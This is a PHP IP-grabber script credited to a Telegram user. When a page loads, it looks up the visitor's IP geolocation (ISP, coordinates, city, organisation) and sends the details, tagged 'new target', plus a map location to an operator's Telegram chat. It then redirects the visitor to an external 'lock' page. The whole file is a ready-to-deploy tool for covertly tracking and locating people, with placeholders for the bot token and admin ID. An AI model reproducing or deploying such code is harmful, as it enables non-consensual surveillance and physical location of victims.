<?php
* 📬 Telegram: @Abolfazl_rwm — ⚠️ استفاده، ویرایش و بازنشر فقط با ذکر منبع مجاز است؛ حذف این اعتبار اجازه نمی‌شود
* Use, edit and redistribute only with attribution to @Abolfazl_rwm.
* ============================== */
$ip = $_SERVER['REMOTE_ADDR'];
$admin = [*[ADMIN]*];//ایدی عددی ادمین
$Get_Ip = json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$lat = $Get_Ip->lat;
$lon = $Get_Ip->lon;
$isp = $Get_Ip->isp;
$regionName = $Get_Ip->regionName;
$region = $Get_Ip->region;
$timezone = $Get_Ip->timezone;
$query = $Get_Ip->query;
$countryCode = $Get_Ip->countryCode;
$country = $Get_Ip->country;
$city = $Get_Ip->city;
$org = $Get_Ip->org;
$token = "PUT-YOUR-BOT-TOKEN";//توکن ربات
$txt = "𝓷𝓮𝓌 𝔱𝔞𝔯𝔤𝔢𝔱\n\n\n( isp : $isp )\n( lat : $lat )\n( ip : $ip )\n( regionName : $regionName )\n( region : $region )\n( timezone : $timezone )\n( query : $query )\n( countryCode : $countryCode )\n( city : $city )\n( country : $country )\n( org : $org )";
file_get_contents("https://api.telegram.org/bot".$token."/sendmessage?chat_id=".$admin."&text=".$txt);
file_get_contents("https://api.telegram.org/bot".$token."/sendLocation?chat_id=".$admin."&latitude=".$lat."&longitude=".$lon);
{
	exit(header("location: https://SnowyTeam.xyz/lock"));
	}
?>